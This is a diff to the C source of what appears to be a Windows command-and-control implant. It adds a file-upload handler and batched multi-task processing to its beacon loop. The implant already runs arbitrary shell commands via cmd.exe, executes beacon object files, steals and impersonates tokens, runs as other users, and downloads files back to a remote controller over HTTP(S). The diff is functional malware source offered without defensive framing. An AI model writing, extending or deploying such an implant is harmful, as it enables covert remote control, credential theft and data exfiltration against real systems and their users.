@@ -376,6 +376,118 @@ static void handle_download(const char *path, char *out_b64) {
     free(buf);
 }
 
+/* Handle 'upload' - write file to target disk.
+   Decoded args format: "<remote_path>\n<base64_file_data>" */
+static void handle_upload(const char *args, char *out_b64) {
+    if (!args || !args[0]) {
+        b64_encode((unsigned char*)"Usage: upload <remote_path> (data in args)", 43, out_b64);
+        return;
+    }
+    const char *nl = strchr(args, '\n');
+    if (!nl) {
+        b64_encode((unsigned char*)"Invalid upload format: expected path\\ndata", 42, out_b64);
+        return;
+    }
+    char path[4096];
+    size_t plen = (size_t)(nl - args);
+    if (plen >= sizeof(path)) plen = sizeof(path) - 1;
+    memcpy(path, args, plen);
+    path[plen] = '\0';
+
+    const char *data_b64 = nl + 1;
+    size_t alloc_sz = strlen(data_b64) + 1;
+    if (alloc_sz < BUF_SIZE) alloc_sz = BUF_SIZE;
+    unsigned char *file_data = (unsigned char *)malloc(alloc_sz);
+    if (!file_data) {
+        b64_encode((unsigned char*)"Out of memory", 13, out_b64);
+        return;
+    }
+    int data_len = b64_decode(data_b64, file_data, alloc_sz);
+    if (data_len <= 0) {
+        free(file_data);
+        b64_encode((unsigned char*)"Invalid file data", 17, out_b64);
+        return;
+    }
+
+    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                                FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        char msg[256];
+        snprintf(msg, sizeof(msg), "Cannot create file: %s (err %lu)", path, GetLastError());
+        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+        free(file_data);
+        return;
+    }
+    DWORD written;
+    WriteFile(hFile, file_data, (DWORD)data_len, &written, NULL);
+    CloseHandle(hFile);
+    free(file_data);
+
+    char msg[256];
+    snprintf(msg, sizeof(msg), "Uploaded %lu bytes to %s", (unsigned long)written, path);
+    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
+}
+
+/* ── Multi-task JSON parser ─────────────────────────────── */
+
+#define MAX_TASKS_PER_BEACON 16
+
+typedef struct {
+    char id[128];
+    char command[256];
+    char arguments_b64[BUF_SIZE];
+} parsed_task;
+
+static int parse_tasks(const char *resp, parsed_task *tasks, int max_tasks) {
+    const char *arr = strstr(resp, "\"tasks\"");
+    if (!arr) return 0;
+    arr = strchr(arr, '[');
+    if (!arr) return 0;
+
+    int count = 0;
+    const char *cursor = arr + 1;
+    char obj[BUF_SIZE];
+
+    while (count < max_tasks) {
+        while (*cursor && *cursor != '{' && *cursor != ']') cursor++;
+        if (*cursor != '{') break;
+
+        const char *start = cursor;
+        int depth = 0;
+        do {
+            if (*cursor == '"') {
+                cursor++;
+                while (*cursor && *cursor != '"') {
+                    if (*cursor == '\\') cursor++;
+                    cursor++;
+                }
+                if (*cursor) cursor++;
+            } else {
+                if (*cursor == '{') depth++;
+                else if (*cursor == '}') depth--;
+                cursor++;
+            }
+        } while (*cursor && depth > 0);
+
+        size_t len = (size_t)(cursor - start);
+        if (len >= sizeof(obj)) len = sizeof(obj) - 1;
+        memcpy(obj, start, len);
+        obj[len] = '\0';
+
+        tasks[count].id[0] = '\0';
+        tasks[count].command[0] = '\0';
+        tasks[count].arguments_b64[0] = '\0';
+
+        json_get_string(obj, "\"id\"", tasks[count].id, sizeof(tasks[count].id));
+        json_get_string(obj, "\"command\"", tasks[count].command, sizeof(tasks[count].command));
+        json_get_string(obj, "\"arguments\"", tasks[count].arguments_b64, sizeof(tasks[count].arguments_b64));
+
+        if (tasks[count].id[0] && tasks[count].command[0])
+            count++;
+    }
+    return count;
+}
+
 /* ── Beacon Loop ─────────────────────────────────────────── */
 
 static DWORD WINAPI run_beacon(LPVOID unused) {
@@ -404,11 +516,9 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
 
     srand((unsigned)GetTickCount() ^ GetCurrentProcessId());
 
-    char body[BUF_SIZE], resp[BUF_SIZE];
-    char task_id[128], task_cmd[256], task_args_b64[BUF_SIZE], args_decoded[BUF_SIZE];
+    char body[BUF_SIZE], resp[BUF_SIZE * 2];
 
     for (;;) {
-        /* ── Build request body ── */
         if (!g_agent_id[0]) {
             char he[128], ue[128], ie[128], pe[512];
             json_escape(hostname, he, sizeof(he));
@@ -423,78 +533,79 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
             snprintf(body, sizeof(body), "{}");
         }
 
-        /* ── Send ── */
         if (http_post(host, port, use_https, path, body, strlen(body),
                       g_agent_id[0] ? g_agent_id : NULL, resp, sizeof(resp)) != 0)
             goto do_sleep;
 
-        /* ── First time: parse agent_id ── */
         if (!g_agent_id[0]) {
             json_get_string(resp, "\"agent_id\"", g_agent_id, sizeof(g_agent_id));
             goto do_sleep;
         }
 
-        /* ── Process task from response ── */
-        task_id[0] = task_cmd[0] = task_args_b64[0] = args_decoded[0] = '\0';
-        if (json_get_string(resp, "\"id\"", task_id, sizeof(task_id)) != 0)
-            goto do_sleep;
-        json_get_string(resp, "\"command\"", task_cmd, sizeof(task_cmd));
-        json_get_string(resp, "\"arguments\"", task_args_b64, sizeof(task_args_b64));
-        if (!task_cmd[0]) goto do_sleep;
+        /* Parse all pending tasks from response */
+        parsed_task tasks[MAX_TASKS_PER_BEACON];
+        int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_BEACON);
+        if (task_count == 0) goto do_sleep;
 
-        /* Decode arguments */
-        if (task_args_b64[0]) {
-            int alen = b64_decode(task_args_b64, (unsigned char*)args_decoded, sizeof(args_decoded)-1);
-            if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
-        }
+        /* Allocate results buffer for all tasks */
+        size_t results_cap = (size_t)(task_count + 1) * (BUF_SIZE + 256) + 256;
+        char *results = (char *)malloc(results_cap);
+        if (!results) goto do_sleep;
+        size_t roff = 0;
+        roff += (size_t)snprintf(results + roff, results_cap - roff, "{\"results\":[");
+        int should_exit = 0;
 
-        /* ── Execute task ── */
-        {
+        for (int t = 0; t < task_count; t++) {
+            char args_decoded[BUF_SIZE];
+            args_decoded[0] = '\0';
+            if (tasks[t].arguments_b64[0]) {
+                int alen = b64_decode(tasks[t].arguments_b64,
+                                      (unsigned char*)args_decoded, sizeof(args_decoded)-1);
+                if (alen > 0) args_decoded[alen] = '\0'; else args_decoded[0] = '\0';
+            }
+
             char out_b64[BUF_SIZE];
             out_b64[0] = '\0';
             int success = 1;
 
-            /* Built-in commands */
-            if (strcmp(task_cmd, "sleep") == 0) {
+            if (strcmp(tasks[t].command, "sleep") == 0) {
                 handle_sleep_cmd(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "whoami") == 0) {
+            } else if (strcmp(tasks[t].command, "whoami") == 0) {
                 handle_whoami(out_b64);
-            } else if (strcmp(task_cmd, "ps") == 0) {
+            } else if (strcmp(tasks[t].command, "ps") == 0) {
                 handle_ps(out_b64);
-            } else if (strcmp(task_cmd, "pwd") == 0) {
+            } else if (strcmp(tasks[t].command, "pwd") == 0) {
                 handle_pwd(out_b64);
-            } else if (strcmp(task_cmd, "cd") == 0) {
+            } else if (strcmp(tasks[t].command, "cd") == 0) {
                 handle_cd(args_decoded[0] ? args_decoded : ".", out_b64);
-            } else if (strcmp(task_cmd, "getuid") == 0) {
+            } else if (strcmp(tasks[t].command, "getuid") == 0) {
                 handle_getuid(out_b64);
-            } else if (strcmp(task_cmd, "bof") == 0) {
+            } else if (strcmp(tasks[t].command, "bof") == 0) {
                 handle_bof(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "download") == 0) {
+            } else if (strcmp(tasks[t].command, "download") == 0) {
                 handle_download(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "steal_token") == 0) {
+            } else if (strcmp(tasks[t].command, "upload") == 0) {
+                handle_upload(args_decoded, out_b64);
+            } else if (strcmp(tasks[t].command, "steal_token") == 0) {
                 handle_steal_token(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "make_token") == 0) {
+            } else if (strcmp(tasks[t].command, "make_token") == 0) {
                 handle_make_token(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "rev2self") == 0) {
+            } else if (strcmp(tasks[t].command, "rev2self") == 0) {
                 handle_rev2self(out_b64);
-            } else if (strcmp(task_cmd, "getprivs") == 0) {
+            } else if (strcmp(tasks[t].command, "getprivs") == 0) {
                 handle_getprivs(out_b64);
-            } else if (strcmp(task_cmd, "runas") == 0) {
+            } else if (strcmp(tasks[t].command, "runas") == 0) {
                 handle_runas(args_decoded, out_b64);
-            } else if (strcmp(task_cmd, "exit") == 0) {
+            } else if (strcmp(tasks[t].command, "exit") == 0) {
                 b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
-                snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":true}]}",
-                         task_id, out_b64);
-                http_post(host, port, use_https, path, body, strlen(body), g_agent_id, resp, sizeof(resp));
-                ExitProcess(0);
+                should_exit = 1;
             } else {
-                /* Shell command via cmd.exe */
                 char cmdline[4096] = "";
-                if (strcmp(task_cmd, "exec") == 0 || strcmp(task_cmd, "shell") == 0) {
+                if (strcmp(tasks[t].command, "exec") == 0 || strcmp(tasks[t].command, "shell") == 0) {
                     if (args_decoded[0]) strncpy(cmdline, args_decoded, sizeof(cmdline)-1);
                 } else {
                     snprintf(cmdline, sizeof(cmdline), "%s%s%s",
-                             task_cmd, args_decoded[0] ? " " : "", args_decoded);
+                             tasks[t].command, args_decoded[0] ? " " : "", args_decoded);
                 }
                 if (cmdline[0]) {
                     success = (exec_cmd(cmdline, out_b64, sizeof(out_b64)) == 0);
@@ -505,11 +616,17 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
                 }
             }
 
-            /* Send result */
-            snprintf(body, sizeof(body), "{\"results\":[{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}]}",
-                     task_id, out_b64, success ? "true" : "false");
-            http_post(host, port, use_https, path, body, strlen(body), g_agent_id, resp, sizeof(resp));
+            if (t > 0) roff += (size_t)snprintf(results + roff, results_cap - roff, ",");
+            roff += (size_t)snprintf(results + roff, results_cap - roff,
+                "{\"task_id\":\"%s\",\"output\":\"%s\",\"success\":%s}",
+                tasks[t].id, out_b64, success ? "true" : "false");
         }
+
+        roff += (size_t)snprintf(results + roff, results_cap - roff, "]}");
+        http_post(host, port, use_https, path, results, roff, g_agent_id, resp, sizeof(resp));
+        free(results);
+
+        if (should_exit) ExitProcess(0);
 
 do_sleep:
         {
